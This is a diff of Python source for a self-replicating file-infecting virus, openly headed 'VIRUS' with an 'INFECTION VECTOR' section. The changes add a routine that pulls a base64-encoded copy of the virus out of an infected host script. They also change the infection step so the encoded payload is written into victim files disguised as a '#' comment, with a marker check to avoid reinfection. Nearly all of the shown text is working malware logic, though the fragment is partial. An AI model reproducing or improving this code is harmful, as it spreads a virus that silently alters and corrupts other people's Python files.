@@ -1,8 +1,35 @@
 ### -_- VIRUS -_- ###
-import glob,sys,re,base64,json,COVID19Py
+
 ### E & D START ###
+import glob,sys,re,base64,json,COVID19Py
+def decrypt():
+    isInfectedFile = True
+    with open(sys.argv[0],"r") as fh:
+        lines = fh.readlines()
+        
+        for line in lines:
+            if(line.startswith("### -_- VIRUS -_- ###")):
+                isInfectedFile = False
+    
+    if(isInfectedFile):
+        with open(sys.argv[0],"r") as fh:
+            lines = fh.readlines()
+            flag = False
+            encryptedCode = str()
+            for line in lines:
+                if(flag):
+                    encryptedCode = line[1:]
 
+                if(line.startswith("### E & D  END ###")):
+                    flag = True
 
+                if(encryptedCode):
+                    print(encryptedCode) 
+                    return encryptedCode
+    else:
+        return 
+
+decrypt()
 ### E & D  END ###
 
 ### INFECTION VECTOR ###
@@ -51,7 +78,7 @@ def infectVirus():
 
         infected = False
         for codeLine in codeLines:
-            if("### -_- VIRUS -_- ###" in codeLine):
+            if("### E & D START ###" in codeLine):
                 infected = True
                 break
         
@@ -68,7 +95,7 @@ def infectVirus():
             
             encryptedVirusCode = base64.b64encode(virusCode.encode("utf-8"))
 
-            newCode.extend(encryptedVirusCode.decode("utf-8"))
+            newCode.extend("#" + encryptedVirusCode.decode("utf-8"))
             
             fileHandler = open(victim,"w")
             fileHandler.writelines(newCode)
